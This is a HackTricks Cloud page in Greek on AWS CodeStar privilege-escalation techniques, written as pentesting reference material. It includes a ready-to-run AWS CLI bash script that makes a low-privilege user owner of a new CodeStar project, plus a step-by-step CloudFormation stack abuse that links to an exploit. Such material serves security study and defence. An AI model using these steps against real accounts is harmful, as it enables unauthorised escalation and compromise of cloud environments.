# AWS - Ενίσχυση προνομίων στο Codestar

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ κάνοντας υποβολή PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Codestar

Μπορείτε να βρείτε περισσότερες πληροφορίες σχετικά με το codestar στο:

{% content-ref url="codestar-createproject-codestar-associateteammember.md" %}
[codestar-createproject-codestar-associateteammember.md](codestar-createproject-codestar-associateteammember.md)
{% endcontent-ref %}

### `iam:PassRole`, `codestar:CreateProject`

Με αυτές τις άδειες μπορείτε να **καταχραστείτε έναν ρόλο IAM του codestar** για να εκτελέσετε **αυθαίρετες ενέργειες** μέσω ενός **προτύπου cloudformation**. Ελέγξτε την παρακάτω σελίδα:

{% content-ref url="iam-passrole-codestar-createproject.md" %}
[iam-passrole-codestar-createproject.md](iam-passrole-codestar-createproject.md)
{% endcontent-ref %}

### `codestar:CreateProject`, `codestar:AssociateTeamMember`

Αυτή η τεχνική χρησιμοποιεί το `codestar:CreateProject` για να δημιουργήσει ένα έργο codestar, και το `codestar:AssociateTeamMember` για να κάνει έναν χρήστη IAM τον **ιδιοκτήτη** ενός νέου έργου CodeStar, το οποίο θα του χορηγήσει μια **νέα πολιτική με μερικές επιπλέον άδειες**.
```bash
PROJECT_NAME="supercodestar"

aws --profile "$NON_PRIV_PROFILE_USER" codestar create-project \
--name $PROJECT_NAME \
--id $PROJECT_NAME

echo "Waiting 1min to start the project"
sleep 60

USER_ARN=$(aws --profile "$NON_PRIV_PROFILE_USER" opsworks describe-my-user-profile | jq .UserProfile.IamUserArn | tr -d '"')

aws --profile "$NON_PRIV_PROFILE_USER" codestar associate-team-member \
--project-id $PROJECT_NAME \
--user-arn "$USER_ARN" \
--project-role "Owner" \
--remote-access-allowed
```
Εάν είστε ήδη μέλος του έργου, μπορείτε να χρησιμοποιήσετε την άδεια `codestar:UpdateTeamMember` για να ενημερώσετε τον ρόλο σας σε ιδιοκτήτη αντί για το `codestar:AssociateTeamMember`.

**Πιθανή Επίδραση:** Ανύψωση προνομίων στην πολιτική codestar που δημιουργήθηκε. Μπορείτε να βρείτε ένα παράδειγμα αυτής της πολιτικής στο:

{% content-ref url="codestar-createproject-codestar-associateteammember.md" %}
[codestar-createproject-codestar-associateteammember.md](codestar-createproject-codestar-associateteammember.md)
{% endcontent-ref %}

### `codestar:CreateProjectFromTemplate`

1. **Δημιουργία Νέου Έργου:**
- Χρησιμοποιήστε την ενέργεια **`codestar:CreateProjectFromTemplate`** για να ξεκινήσετε τη δημιουργία ενός νέου έργου.
- Μετά την επιτυχή δημιουργία, η πρόσβαση χορηγείται αυτόματα για το **`cloudformation:UpdateStack`**.
- Αυτή η πρόσβαση στοχεύει ειδικά ένα stack που σχετίζεται με τον ρόλο IAM `CodeStarWorker-<γενικό όνομα έργου>-CloudFormation`.

2. **Ενημέρωση του Στόχου Stack:**
- Με τις χορηγηθείσες άδειες CloudFormation, προχωρήστε στην ενημέρωση του συγκεκριμένου stack.
- Το όνομα του stack συνήθως θα συμμορφώνεται με έναν από τους δύο παρακάτω τύπους:
- `awscodestar-<γενικό όνομα έργου>-infrastructure`
- `awscodestar-<γενικό όνομα έργου>-lambda`
- Το ακριβές όνομα εξαρτάται από το επιλεγμένο πρότυπο (αναφορά στο παράδειγμα εκμετάλλευσης σεναρίου).

3. **Πρόσβαση και Άδειες:**
- Μετά την ενημέρωση, αποκτάτε τις δυνατότητες που έχουν ανατεθεί στον **ρόλο IAM του CloudFormation** που συνδέεται με το stack.
- Σημείωση: Αυτό δεν παρέχει απαραίτητα πλήρεις διαχειριστικές άδειες. Ενδέχεται να απαιτούνται επιπλέον κακοδιαμορφωμένοι πόροι εντός του περιβάλλοντος για περαιτέρω ανύψωση προνομίων.

Για περισσότερες πληροφορίες ελέγξτε την αρχική έρευνα: [https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/](https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/).\
Μπορείτε να βρείτε την εκμετάλλευση στο [https://github.com/RhinoSecurityLabs/Cloud-Security-Research/blob/master/AWS/codestar\_createprojectfromtemplate\_privesc/CodeStarPrivEsc.py](https://github.com/RhinoSecurityLabs/Cloud-Security-Research/blob/master/AWS/codestar\_createprojectfromtemplate\_privesc/CodeStarPrivEsc.py)

**Πιθανή Επίδραση:** Ανύψωση προνομίων στον ρόλο IAM του cloudformation.
